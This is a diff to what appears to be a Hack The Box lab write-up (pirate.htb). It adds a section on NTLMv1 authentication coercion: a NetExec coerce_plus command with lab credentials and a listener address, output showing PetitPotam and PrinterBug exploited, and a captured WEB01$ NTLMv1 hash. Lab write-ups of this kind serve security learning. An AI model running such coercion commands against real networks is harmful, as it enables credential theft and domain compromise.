@@ -415,11 +415,28 @@ evil-winrm-py PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents>
 
 I can authenticate here as the ADFS account but not the ADCS account
 
-# NetNTLMv1 coersion
+# NTLMv1 coersion
 
 ```python
-
+faketime -f +7h nxc smb web01.pirate.htb -u 'ms01$' -p 'ms01' -k -M coerce_plus -o LISTENER=10.10.14.61
+SMB         web01.pirate.htb 445    WEB01            [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:None)
+SMB         web01.pirate.htb 445    WEB01            [+] pirate.htb\ms01$:ms01 
+COERCE_PLUS web01.pirate.htb 445    WEB01            VULNERABLE, PetitPotam
+COERCE_PLUS web01.pirate.htb 445    WEB01            Exploit Success, efsrpc\EfsRpcAddUsersToFile
+COERCE_PLUS web01.pirate.htb 445    WEB01            VULNERABLE, PrinterBug
+COERCE_PLUS web01.pirate.htb 445    WEB01            Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
+COERCE_PLUS web01.pirate.htb 445    WEB01            VULNERABLE, MSEven
 ```
+
+Ill coerce auth from `web01$` back to me
+
+```python
+[SMB] NTLMv1-SSP Client   : 10.129.244.95
+[SMB] NTLMv1-SSP Username : PIRATE\WEB01$
+[SMB] NTLMv1-SSP Hash     : WEB01$::PIRATE:375E28CAB3025DE400000000000000000000000000000000:ACD8AAD51733BC893428BF25C3F6600CB316B18D516A3770:0c2f849c84700ef9
+```
+
+
 
 
 
